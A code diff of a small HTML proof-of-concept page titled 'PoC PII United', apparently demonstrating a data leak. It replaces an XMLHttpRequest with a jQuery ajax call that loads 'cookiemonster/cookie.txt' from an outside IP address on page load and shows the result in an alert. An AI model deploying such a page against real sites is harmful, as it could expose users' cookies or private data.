@@ -1,21 +1,19 @@
 <html>
 <head><title>PoC PII United</title></head>
 <body>
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/core.js'></script>
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js'></script>
 <div id="x">
-
-</div>	
+</div>
 <script>
-function loadDoc() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("x").innerHTML =
-      this.responseText;
+ $.ajax({
+    type: 'GET',
+    url: 'http://93.66.243.251/cookiemonster/cookie.txt',
+    dataType: 'text',
+    complete: function(data){
+       alert(data);
     }
-  };
-  xhttp.open("GET", "http://93.66.243.251/cookiemonster/cookie.txt", true);
-  xhttp.send();
-}
+ });
 </script>
 
 
